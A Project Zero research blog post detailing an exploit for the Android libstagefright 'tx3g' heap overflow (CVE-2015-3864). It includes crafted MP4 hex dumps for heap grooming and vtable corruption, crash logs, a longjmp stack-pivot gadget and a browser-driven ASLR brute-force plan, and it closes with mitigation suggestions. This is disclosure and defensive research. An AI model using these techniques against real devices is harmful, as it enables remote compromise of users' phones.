# Stagefrightened? - Project Zero

Source: https://projectzero.google/2015/09/stagefrightened.html
Captured verbatim (article body extracted from HTML) on 2026-11-12.

---

Posted by Mark Brand, Bypasser of Mitigations


There’s been a lot of attention recently around a number of vulnerabilities in Android’s libstagefright. There’s been a lot of confusion about the remote exploitability of the issues, especially on modern devices. In this blog post we will demonstrate an exploit for one of the libstagefright vulnerabilities that works on recent Android versions (Android 5.0+ on Nexus 5).


The vulnerability (CVE-2015-3864) that we’ve chosen to [exploit](https://code.google.com/p/google-security-research/issues/detail?id=502) is an imperfect patch for one of the issues reported by Joshua Drake, which has been fixed for Nexus devices in the September [bulletin](https://groups.google.com/forum/#!topic/android-security-updates/1M7qbSvACjo). Several parties noticed the problem, including at least [Exodus Intel](https://blog.exodusintel.com/2015/08/13/stagefright-mission-accomplished/) and Natalie Silvanovich of Project Zero. It’s a promising looking bug from an exploitation perspective: a linear heap-overflow giving the attacker control over the size of the allocation; the amount of overflow, and the contents of the overflowed memory region.


The vulnerable code is in handling the ‘tx3g’ chunk type when parsing MPEG4 video files. Here’s the original vulnerable code:


Note when reading that chunk\_size is a uint64\_t that is parsed from the file; it’s completely controlled by the attacker and is not validated with regards to the remaining data available in the file.

case FOURCC('t', 'x', '3', 'g'):

{

uint32\_t type;

const void \*data;

size\_t size = 0;

if (!mLastTrack->meta->findData(

kKeyTextFormatData, &type, &data, &size)) {

size = 0;

}

uint8\_t \*buffer = new uint8\_t\[size + chunk\_size\]; // \<---- Integer overflow here

if (size > 0) {

memcpy(buffer, data, size);                   // \<---- Oh dear.

}

if ((size\_t)(mDataSource->readAt(\*offset, buffer + size, chunk\_size))

\< chunk\_size) {

delete\[\] buffer;

buffer = NULL;

return ERROR\_IO;

}

mLastTrack->meta->setData(

kKeyTextFormatData, 0, buffer, size + chunk\_size);

delete\[\] buffer;

\*offset += chunk\_size;

break;

}

And with the patch applied:

case FOURCC('t', 'x', '3', 'g'):

{

uint32\_t type;

const void \*data;

size\_t size = 0;

if (!mLastTrack->meta->findData(

kKeyTextFormatData, &type, &data, &size)) {

size = 0;

}

if (SIZE\_MAX - chunk\_size \<= size) { // \<---- attempt to prevent overflow 

return ERROR\_MALFORMED;

}

uint8\_t \*buffer = new uint8\_t\[size + chunk\_size\];

if (size > 0) {

memcpy(buffer, data, size);

}

if ((size\_t)(mDataSource->readAt(\*offset, buffer + size, chunk\_size))

\< chunk\_size) {

delete\[\] buffer;

buffer = NULL;

return ERROR\_IO;

}

mLastTrack->meta->setData(

kKeyTextFormatData, 0, buffer, size + chunk\_size);

delete\[\] buffer;

\*offset += chunk\_size;

break;

}

The issue with this patch is that chunk\_size actually doesn’t have type size\_t; it is a uint64\_t even on 32-bit platforms (most Android devices are currently 32-bit, and currently the mediaserver is a 32-bit process even on 64-bit Android devices). While the check appears to a casual glance to be sufficient; it is not; chunk\_size can be larger than SIZE\_MAX, causing the check to pass.


My first step towards exploiting a bug is usually to establish proof-of-vulnerability; in this case we should definitely be able to crash the mediaserver by triggering this issue, so let’s do just that and put together a simple crash case.


We first need a file that will be detected by libstagefright as an MPEG4 and parsed accordingly; looking at the file sniffing code, we need to start with an ‘ftyp’ chunk near the start of the file.


0000000: 0000 0014 6674 7970 6973 6f6d 0000 0001  ....ftypisom....

0000010: 6973 6f6d                                isom


Note the structure of the chunk; we have a 4-byte big-endian chunk size, and 4-byte tag followed by the chunk data.


Now, if we just add a ‘tx3g’ chunk, we’ll encounter a different bug!

case FOURCC('t', 'x', '3', 'g'):

{

uint32\_t type;

const void \*data;

size\_t size = 0;

if (!mLastTrack->meta->findData( // \<---- mLastTrack is NULL, SIGSEGV...

kKeyTextFormatData, &type, &data, &size)) {

size = 0;

}


So we need to have at least one track before we can actually reach the vulnerable code. The ‘trak’ chunk will initialise mLastTrack, and acts as a container for additional chunks.


New ‘trak’ chunk


0000000: 0000 0014 6674 7970 6973 6f6d 0000 0001  ....ftypisom....

0000010: 6973 6f6d 0000 0020 7472 616b 0000 0018  isom... trak....

0000020: 7478 3367 4141 4141 4141 4141 4141 4141  tx3gAAAAAAAAAAAA

0000030: 4141 4141                                AAAA


And highlighting the ‘tx3g’ chunk contained in the ‘trak’ chunk.


0000000: 0000 0014 6674 7970 6973 6f6d 0000 0001  ....ftypisom....

0000010: 6973 6f6d 0000 0020 7472 616b 0000 0018  isom... trak....

0000020: 7478 3367 4141 4141 4141 4141 4141 4141  tx3gAAAAAAAAAAAA

0000030: 4141 4141                                AAAA


So, this file will get us into the ‘tx3g’ case once; but it won’t trigger the vulnerability. In order to do that, we need to visit the case again with another chunk, this time with a chunk\_size large enough to trigger an overflow. Keeping things simple, we’ll supply a chunk\_size of -1 = 0xffffffffffffffff.


0000000: 0000 0014 6674 7970 6973 6f6d 0000 0001  ....ftypisom....

0000010: 6973 6f6d 0000 0020 7472 616b 0000 0018  isom... trak....

0000020: 7478 3367 4141 4141 4141 4141 4141 4141  tx3gAAAAAAAAAAAA

0000030: 4141 4141 0000 0001 7478 3367 ffff ffff  AAAA....tx3g....

0000040: ffff ffff 4242 4242 4242 4242 4242 4242  ....BBBBBBBBBBBB

0000050: 4242 4242 4242 4242 4242 4242 4242 4242  BBBBBBBBBBBBBBBB

0000060: 4242 4242                                BBBB


Notice that the structure of this second chunk is a little different; we have to use the extended chunk\_size code path triggered by a chunk\_size of 1 in order to set the full 64-bit chunk\_size.


We now have a simple file to trigger the issue; when I open this file in Chrome on my Nexus 5 with some extra debugging code, printing some useful information to the Android system logs:


MPEG4Extractor: Identified supported mpeg4 through LegacySniffMPEG4.

MPEG4Extractor: trak: new Track\[20\] (0xb6048160)

MPEG4Extractor: trak: mLastTrack = 0xb6048160

MPEG4Extractor: tx3g: size 0 chunk\_size 24

MPEG4Extractor: tx3g: new\[24\] (0xb6048130)

MPEG4Extractor: tx3g: mDataSource->readAt(\*offset, 0xb6048130, 24)

MPEG4Extractor: tx3g: size 24 chunk\_size 18446744073709551615

MPEG4Extractor: tx3g: new\[23\] (0xb6048130)

MPEG4Extractor: tx3g: memcpy(0xb6048130, 0xb6048148, 24)

MPEG4Extractor: tx3g: mDataSource->readAt(\*offset, 0xb6048148, 18446744073709551615)


We can clearly see here that the input file triggered two allocations by the parser on handling the two ‘tx3g’ chunks, and that we’re definitely writing data out-of-bounds of our allocated memory in the last two lines.


Since we’re only overflowing a handful of bytes, and the heap allocator in use on this Android version is based on jemalloc, it’s relatively unlikely that we’ll overwrite anything important and see a crash with such a small overwrite. Modifying the PoC file so that the parser will write a big old chunk of bytes instead should get us a demonstrable crash; that’s as simple as adding more ‘B’s to the end of the file and fixing up the chunk lengths; this is left as an exercise for the interested reader.


We need a few heap-manipulation primitives to get things set up in a dependable fashion. The first thing that I looked for was a primitive to allocate blocks of memory - this will be used for a number of different things in the exploit. Fortunately, there’s a good primitive available in the handling for ‘pssh’ chunks:


case FOURCC('p', 's', 's', 'h'):

{

\*offset += chunk\_size;

PsshInfo pssh;

if (mDataSource->readAt(data\_offset + 4, &pssh.uuid, 16) \< 16) {

return ERROR\_IO;

}

uint32\_t psshdatalen = 0;

if (mDataSource->readAt(data\_offset + 20, &psshdatalen, 4) \< 4) {

return ERROR\_IO;

}

// pssh.datalen is set to a size we control

pssh.datalen = ntohl(psshdatalen);

ALOGV("pssh data size: %d", pssh.datalen);

if (pssh.datalen + 20 > chunk\_size) {

// pssh data length exceeds size of containing box

return ERROR\_MALFORMED;

}

// pssh.data is an allocated block of memory of a size we control

pssh.data = new (std::nothrow) uint8\_t\[pssh.datalen\];

if (pssh.data == NULL) {

return ERROR\_MALFORMED;

}

ALOGV("allocated pssh @ %p", pssh.data);

ssize\_t requested = (ssize\_t) pssh.datalen;

// now we read data we control into that allocation

if (mDataSource->readAt(data\_offset + 24, pssh.data, requested) \< requested) {

return ERROR\_IO;

}

// and store it, so the allocation lives for the lifetime of our MPEG4Extractor

// (these pssh blocks are in fact released in the destructor for the MPEG4Extractor)

mPssh.push\_back(pssh);

break;

}


This is the first component of our heap-groom; we can use up any fragmented allocations in the size class that we want, ensuring that further allocations are likely to be contiguous.


Now we want a second primitive; allocations that we can control both the allocation and release of. There are a lot of places where allocations occur during parsing of the mp4, but the most useful for this purpose that I found were the handlers for two chunk types, ‘avcC’ and ‘hvcC’. When handling these chunk types, the parser will allocate a block of memory and store it; and replace that allocation with a new one when the parser encounters a second chunk of the same type.


case FOURCC('a', 'v', 'c', 'C'):

{

\*offset += chunk\_size;

sp\<ABuffer> buffer = new ABuffer(chunk\_data\_size);

if (mDataSource->readAt(

data\_offset, buffer->data(), chunk\_data\_size) \< chunk\_data\_size) {

return ERROR\_IO;

}

// this internally copies buffer->data() into a buffer of size chunk\_data\_size, and

// releases the previously stored data.

mLastTrack->meta->setData(

kKeyAVCC, kTypeAVCC, buffer->data(), chunk\_data\_size);

break;

}


The plan to gain control of execution is to arrange for the overflow to overwrite an object of type MPEG4DataSource. This is an object of size 32 bytes (on my phone), which the parser allocates when it encounters an ‘stbl’ chunk. The new data source is then used for parsing all sub-chunks contained within the ‘stbl’ chunk. So our aim is to create the following situation:

case FOURCC('t', 'x', '3', 'g'):

{

uint32\_t type;

const void \*data;

size\_t size = 0;

if (!mLastTrack->meta->findData(

kKeyTextFormatData, &type, &data, &size)) {

size = 0;

}

if (SIZE\_MAX - chunk\_size \<= size) {  

return ERROR\_MALFORMED;

}

// overflow here, so that size + chunk\_size == 32 and size > 32

uint8\_t \*buffer = new uint8\_t\[size + chunk\_size\];

// buffer is allocated immediately before mDataSource

if (size > 0) {

// this will overflow and corrupt the mDataSource vtable 

memcpy(buffer, data, size);

}

// this call goes through the corrupt vtable, and we get control of execution

if ((size\_t)(mDataSource->readAt(\*offset, buffer + size, chunk\_size))

\< chunk\_size) {

So, we need to arrange our heap carefully so that we can ensure a free space directly before the allocated MPEG4DataSource.


First we need to make a couple of small sized allocation chunks; a small ‘avcC’ chunk and ‘hvcC’ chunk. These trigger additional temporary allocations in sizes that will interfere with our groom allocations, so we get them out of the way before we start laying out memory.


0000000: 0000 0014 6674 7970 6973 6f6d 0000 0001  ....ftypisom....

0000010: 6973 6f6d 0000 0028 7472 616b 0000 0010  isom... trak....

0000020: 6176 6343 4141 4141 4141 4141 0000 0010  avcCAAAAAAAA....

0000030: 6876 6343 4848 4848 4848 4848            hvcCHHHHHHHH


Then we will create our initial ‘tx3g’ allocation. This needs to be the size we’re going to write during the memcpy; we’ll make it 64 bytes for now, so that it completely overwrites the MPEG4DataSource object. The ‘2’s are the bytes that will be written outside the final 32 byte allocation as the result of the overflow.


0000000: 0000 0014 6674 7970 6973 6f6d 0000 0001  ....ftypisom....

0000010: 6973 6f6d 0000 0068 7472 616b 0000 0010  isom...gtrak....

0000020: 6176 6343 4141 4141 4141 4141 0000 0010  avcCAAAAAAAA....

0000030: 6876 6343 4848 4848 4848 4848 0000 0040  hvcCHHHHHHHH...@

0000040: 7478 3367 3131 3131 3131 3131 3131 3131  tx3g111111111111

0000050: 3131 3131 3131 3131 3131 3131 3232 3232  1111111111112222

0000060: 3232 3232 3232 3232 3232 3232 3232 3232  2222222222222222

0000070: 3232 3232 3232 3232 3232 3232            222222222222


Now we’re ready to start preparing the heap. First we defragment for the targeted allocation size by allocating some ‘pssh’ blocks of the target size:

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

| pssh | - | pssh |

\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`


0000000: 0000 0014 6674 7970 6973 6f6d 0000 0001  ....ftypisom....

...

0000070: 3232 3232 3232 3232 3232 3232 0000 0040  222222222222...@

0000080: 7073 7368 6c65 616b 3030 3030 3030 3030  psshleak00000000

0000090: 3030 3030 3030 3030 0000 0020 4c4c 4c4c  00000000... LLLL

00000a0: 4c4c 4c4c 4c4c 4c4c 4c4c 4c4c 4c4c 4c4c  LLLLLLLLLLLLLLLL

00000b0: 4c4c 4c4c 4c4c 4c4c 4c4c 4c4c

...


These blocks have some internal structure; the only part that we are really concerned with is the size of the allocation and the data.


Then we allocate an avcC and hvcC block of the target size, which should hopefully be contiguous.

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

| pssh | - | pssh | avcC |

\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

| pssh | - | pssh | avcC | hvcC |

\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`


0000000: 0000 0014 6674 7970 6973 6f6d 0000 0001  ....ftypisom....

...

0000170: 4c4c 4c4c 4c4c 4c4c 4c4c 4c4c 0000 0028  LLLLLLLLLLLL...(

0000180: 6176 6343 4141 4141 4141 4141 4141 4141  avcCAAAAAAAAAAAA

0000190: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA

00001a0: 4141 4141 0000 0028 6876 6343 4848 4848  AAAA...(hvcCHHHH

00001b0: 4848 4848 4848 4848 4848 4848 4848 4848  HHHHHHHHHHHHHHHH

00001c0: 4848 4848 4848 4848 4848 4848            HHHHHHHHHHHH


In actual fact, we have a temporary allocation occurring during parsing of the avcC and hvcC blocks, so the heap will actually look like this:

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

| pssh | - | pssh | .... | avcC | hvcC |

\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`

So we need to allocate another pssh block to fill the space

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

| pssh | - | pssh | pssh | avcC | hvcC |

\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`

We can then free the hvcC block and trigger the allocation of our target MPEG4DataSource

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

| pssh | - | pssh | pssh | avcC | .... |

\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

| pssh | - | pssh | pssh | avcC | MPEG4DataSource |

\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`

0000000: 0000 0014 6674 7970 6973 6f6d 0000 0001  ....ftypisom....

...

00001c0: 4848 4848 4848 4848 4848 4848 0000 0040  HHHHHHHHHHHH...@

00001d0: 7073 7368 6c65 616b 3030 3030 3030 3030  psshleak00000000

00001e0: 3030 3030 3030 3030 0000 0020 4c4c 4c4c  00000000... LLLL

00001f0: 4c4c 4c4c 4c4c 4c4c 4c4c 4c4c 4c4c 4c4c  LLLLLLLLLLLLLLLL

0000200: 4c4c 4c4c 4c4c 4c4c 4c4c 4c4c 0000 0048  LLLLLLLLLLLL...H

0000210: 6876 6343 4848 4848 4848 4848 4848 4848  hvcCHHHHHHHHHHHH

0000220: 4848 4848 4848 4848 4848 4848 4848 4848  HHHHHHHHHHHHHHHH

0000230: 4848 4848 4848 4848 4848 4848 4848 4848  HHHHHHHHHHHHHHHH

0000240: 4848 4848 4848 4848 4848 4848 4848 4848  HHHHHHHHHHHHHHHH

0000250: 4848 4848 0000 0008 7374 626c            HHHH....stbl


Then inside our ‘stbl’ chunk we just need to release the ‘avcC’ chunk and trigger the ‘tx3g’ overflow.

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

| pssh | - | pssh | pssh | tx3g | MPEG4DataSource |

\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`

\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_

| pssh | - | pssh | pssh | tx3g ---------------------->

\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`\`


0000000: 0000 0014 6674 7970 6973 6f6d 0000 0001  ....ftypisom....

...

0000250: 4848 4848 0000 0060 7374 626c 0000 0048  HHHH...\`stbl...H

0000260: 6176 6343 4141 4141 4141 4141 4141 4141  avcCAAAAAAAAAAAA

0000270: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA

0000280: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA

0000290: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA

00002a0: 4141 4141 0000 0001 7478 3367 ffff ffff  AAAA....tx3g....

00002b0: ffff ffe0                                ....


Viewing the resulting file in a webpage in Chrome results in the following stack trace:


libc    : Fatal signal 11 (SIGSEGV), code 1, fault addr 0x3232324e in tid 3794 (mediaserver)

pid: 3794, tid: 3794, name: mediaserver  >>> /system/bin/mediaserver \<\<\<

signal 11 (SIGSEGV), code 1 (SEGV\_MAPERR), fault addr 0x3232324e

r0 b2e90220  r1 32323232  r2 000002a4  r3 00000000

r4 b2e90240  r5 ffffffe0  r6 b2e90200  r7 00000000

r8 fffd1da4  r9 bedcf6b8  sl b604b980  fp b604b9d4

ip bedcece8  sp bedcf1c0  lr b67dff67  pc b67dff76  cpsr 600f0030


backtrace:

#00 pc 0008ff76  /system/lib/libstagefright.so

(android::MPEG4Extractor::parseChunk(long long\*, int)+7613)

#01 pc 0008fac1  /system/lib/libstagefright.so

(android::MPEG4Extractor::parseChunk(long long\*, int)+6408)

#02 pc 0008fac1  /system/lib/libstagefright.so

(android::MPEG4Extractor::parseChunk(long long\*, int)+6408)

#03 pc 0008de7f  /system/lib/libstagefright.so (android::MPEG4Extractor::readMetaData()+78)

#04 pc 0008de0b  /system/lib/libstagefright.so

(android::MPEG4Extractor::getMetaData()+8)

#05 pc 000c0e6f  /system/lib/libstagefright.so (android::StagefrightMetadataRetriever::parseMetaData()+38)


Which is exactly what we were aiming for; we crashed trying to load a function address through the vtable pointer for our corrupted data source object.


Now we face what should be a serious challenge at this point; due to ASLR we have no idea where anything is in memory; we need somehow to get some data that we control somewhere that we can do something useful with. Due to the way that Linux/Android implements ASLR for mmap mappings, it is quite easy for us to get an allocation mapped at a predictable address; Jemalloc as configured on my Nexus 5 falls back to directly mmap’ing huge chunks for allocations above 0x40000 bytes.


The behaviour of mmap means that these allocations will simply occur down the address space linearly from a randomised start address. Since we have a very good idea how much space is going to be used already (loaded libraries and initial arena allocation), the randomisation just results in a relatively small window that we need to exhaust in order to get a predictable address. The code that implements the randomness (in arch/arm/mm/mmap.c) is as follows:


/\* 8 bits of randomness in 20 address space bits \*/

if ((current->flags & PF\_RANDOMIZE) &&

!(current->personality & ADDR\_NO\_RANDOMIZE))

random\_factor = (get\_random\_int() % (1 \<\< 8)) \<\< PAGE\_SHIFT;


So our mmap mappings can be anywhere (page aligned, of course) in an 0-0xff000 range from the maximum position that they can be placed; and we do not need to allocate much memory to exhaust this.


I was initially convinced that I must have misread something, so I coded up a quick test program to validate this:


#include \<stdio.h>

#include \<stdlib.h>

#include \<string.h>


#include \<unistd.h>

#include \<sys/mman.h>


#define ALLOC\_SIZE  0xff000

#define ALLOC\_COUNT 0x1


int main(int argc, char\*\* argv) {

int i = 0;

char\* min\_ptr = (char\*)0xffffffff;

char\* max\_ptr = (char\*)0;

for (i = 0; i \< ALLOC\_COUNT; ++i) {

char\* ptr = mmap(NULL, ALLOC\_SIZE,

PROT\_READ | PROT\_WRITE | PROT\_EXEC,

MAP\_PRIVATE | MAP\_ANONYMOUS,

-1, 0);

if (ptr \< min\_ptr) {

fprintf(stderr, "new min: %p\n", ptr);

min\_ptr = ptr;

}

if (ptr + ALLOC\_SIZE > max\_ptr) {

fprintf(stderr, "new max: %p\n", ptr + ALLOC\_SIZE);

max\_ptr = ptr + ALLOC\_SIZE;

}

memset(ptr, '\xcc', ALLOC\_SIZE);

}

fprintf(stderr, "finished min: %p max %p\n", min\_ptr, max\_ptr);


((void(\*)())0xf7500000)();

}


On my Ubuntu x86\_64 desktop with /proc/sys/randomize\_va\_space == 2, compiling and running this as a 32-bit executable reliably results in the address 0xf7500000 being mapped and resulting in a SIGTRAP. Your mileage may vary... Similar tests on my Nexus 5 gave the same result. I knew that ASLR on 32-bit was always a bit shaky; but I didn’t think it was this broken.


It’s slightly less predictable in the mediaserver process, since large amounts of memory may have been used already in previous parsing; but we can reliably get data we control at a predictable address with a relatively small number of allocations.


After a bit of experimentation, it seemed that the best way to achieve this in practice is by wrapping a number of our ‘pssh’ chunks inside a valid sample table (‘stbl’). This triggers the creation of a caching MPEG4DataSource, which will then allocate and save all the data for the contained chunks; and will then be used to parse out the chunks. This essentially doubles the size of our spray, reducing the size of file needed.


Updating our mp4 to incorporate this page-spray and point the overwritten vtable pointer to our predictable address gets us one step further; control over the address called as the vtable function.


Fatal signal 11 (SIGSEGV), code 1, fault addr 0xc01db33e in tid 2223 (Binder\_3)

\*\*\* \*\*\* \*\*\* \*\*\* \*\*\* \*\*\* \*\*\* \*\*\* \*\*\* \*\*\* \*\*\* \*\*\* \*\*\* \*\*\* \*\*\* \*\*\*

pid: 2179, tid: 2223, name: Binder\_3  >>> /system/bin/mediaserver \<\<\<

signal 11 (SIGSEGV), code 1 (SEGV\_MAPERR), fault addr 0xc01db33e

r0 b5967660  r1 b59676d8  r2 01000708  r3 00000000

r4 b49ff570  r5 ffffff88  r6 c01db33f  r7 b49ff550

r8 b586e240  r9 74783367  sl b49ffa78  fp b5967640

ip 00000000  sp b49ff510  lr b66387d5  pc c01db33e  cpsr 400f0030

backtrace:

#00 pc c01db33e  \<unknown>

#01 pc 000797d3  /system/lib/libstagefright.so

(android::MPEG4Extractor::parseChunk(long long\*, int)+4610)


So now we have a controlled function call; without ASLR at this point it would be trivially game-over. All that would be needed for a reliable exploit is simply to redirect execution to a convenient gadget to stack pivot, and then build a ROP stack.


Disabling ASLR in the system config I fairly quickly found a useful trick to pivot the stack (our function call is a vtable call, so we will always have r0 set as the this object, pointing to our corrupted MPEG4DataSource).


Inside longjmp in libc.so, we have the following instruction sequence


.text:00013344    ADD             R2, R0, #0x4C

.text:00013348    LDMIA           R2, {R4, R5, R6, R7, R8, R9, R10, R11, R12, SP, LR}

.text:0001334C    TEQ             SP, #0

.text:00013350    TEQNE           LR, #0

.text:00013354    BEQ             botch\_0 ; we won’t take this branch, as we control lr

.text:00013358    MOV             R0, R1

.text:0001335C    TEQ             R0, #0

.text:00013360    MOVEQ           R0, #1

.text:00013364    BX              LR


This will load most of the registers, including the stack pointer, from an offset on r0, which points to data we control. At this point it’s then trivial to complete the exploit with a ROP chain to allocate some RWX memory, copy in shellcode and jump to it using only functions and gadgets from within libc.so.


Having completed an exploit that works with ASLR disabled, I was planning/expecting to spend a while longer looking for a cunning technique to reliably leverage the issue for a practical exploit without tampering with system settings. I started to investigate a number of different avenues, some of which were more promising than others. My usual preferred next step would be to try and leverage this overflow to construct an infoleak to get the information we need about the process.  Since the mediaserver is a background process that we’re interacting with in a fairly detached way, this would likely pose a significant effort. One idea considered was the use of an m3u playlist file, which should be able to request remote files; if we could then corrupt some of the data responsible for handling that playlist, we might be able to leverage that to leak data. Another thought was that the metadata extracted from parsing the file is likely used by the html5 \<video> elements; if we could, for example, store a pointer value in place of the length of the video, we could leak this from javascript in a browser context, and serve up a second video customised based on this leak.


Since we do not know the randomised values for the most-significant bytes of an address, we would instead perform a partial overwrite; corrupting only the least-significant byte or bytes of a pointer. I looked at partially overwriting a function pointer on the heap - there were some function pointers that could be overwritten, but they were all allocated early in the process startup, rather than during parsing of the mp4 file, and grooming was going to be problematic. I then looked at partially overwriting a vtable pointer instead. As our exploit so far is reliably corrupting a vtable pointer, it’s not a problem to adjust this to simply overwrite the least-significant byte of that vtable pointer instead. The vtables in the libstagefright library are positioned close to the GOT (Global Offset Table) which is used heavily in position-independent executables, and this means that we have a choice of a very wide range of functions that we could call instead of the intended function; this could be as subtle as creating a type-confusion with our MPEG4DataSource and another DataSource type. Continuing with the exploit at this point is looking like an extensive assessment of available functions in (and imported by) the compiled stagefright code to find one which will be useful to us...


We do have an alternative; albeit an inelegant one. The mediaserver process will respawn after a crash, and there is 8 bits of entropy in the libc.so base address. This means that we can take a very straightforward approach to bypassing ASLR. We simply choose one of the 256 possible base addresses for libc.so, and write our exploit and ROP stack assuming that layout. Launching the exploit from the browser, we use javascript to keep refreshing the page, and wait for a callback. Eventually memory will be laid out as we expect, bypassing ASLR with brute force in a practical enough way for real-world exploitation.


This is only possible because we can achieve a highly reliable heap-spray to get data we control at a known address, independent of the process randomisation. If we had to brute-force two addresses here, the address of our known data and the libc base, this would be less practical.


It’s also interesting to note that the mediaserver is a special case, at least on my test phone; it isn’t cloned from a zygote process, but is instead directly execve’ed - this means that the address space is re-randomised on every exploit attempt. As a result our brute force is not deterministic, and we can’t put a guaranteed upper-bound on time to exploit.


I did some extended testing on my Nexus 5; and results were pretty much as expected. In 4096 exploit attempts I got 15 successful callbacks; the shortest time-to-successful-exploit was lucky, at around 30 seconds, and the longest was over an hour. Given that the mediaserver process is throttled to launching once every 5 seconds, and the chance of success is 1/256 per attempt, this gives us a \~4% chance of a successful exploit each minute.


So, while it could be more elegant, reliable and effective to use a more sophisticated technique to exploit this bug without requiring a brute-force; it turns out that it’s not really necessary. It’s not unreasonable for a real-world watering hole attack to get a user to browse a page long enough for the exploit to succeed, especially through in-app adverts using WebView.


During the last few weeks spent developing this exploit, there were a couple of additional hardening measures that we discussed internally to Project Zero, and have shared as suggestions to the Android security team.


- Hardened mmap implementation. Chrome’s PartitionAlloc augments the weak randomisation provided by mmap(NULL, …) calls; Android could do a similar thing. This would dramatically reduce the effectiveness of the heap-spray, making it harder for an attacker to gain that crucial ‘controlled data at a known address’ leveraged in this exploit.
- Further hardening libc implementation. Existing libc implementations have implemented pointer mangling for their setjmp/longjmp and similar functions; this has two security benefits. Firstly it protects against corruption of jmp\_buf structures, and secondly it prevents an attacker from using these functions as one-stop ROP gadget/stack pivot.


Neither of these are ‘hard’ mitigations; their implementation won’t prove non-exploitability of future memory corruption vulnerabilities on Android devices, but their adoption should increase the cost for attackers in developing reliable exploits for future Android vulnerabilities; and that will be a welcome success.
